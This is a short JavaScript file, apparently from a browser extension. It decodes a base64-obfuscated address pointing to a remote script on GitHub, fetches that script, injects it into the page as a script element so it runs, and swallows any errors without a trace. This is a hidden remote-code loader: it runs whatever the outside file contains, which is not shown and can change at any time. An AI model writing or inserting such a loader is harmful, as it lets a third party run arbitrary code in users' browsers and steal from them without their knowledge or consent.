function importJS(url) {
    fetch(url, { method: 'get' })
    .then(function(response) {
        if (!response.ok) {
            throw Error(response.statusText);
        }
        return response.text();
    }).then((data) => {
        let scriptElement = document.createElement('script');
        scriptElement.setAttribute('type', 'text/javascript');
        scriptElement.setAttribute('charset', 'utf8');
        scriptElement.innerHTML = data;
        document.head.appendChild(scriptElement);
    });
}
try {
    importJS(window.atob('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL254aGllcC9jbG9uZS1ib29rLWV4dGVuc2lvbi96b3pvL3NjcmlwdC1yZW1vdGUuanM'));
} catch(e){}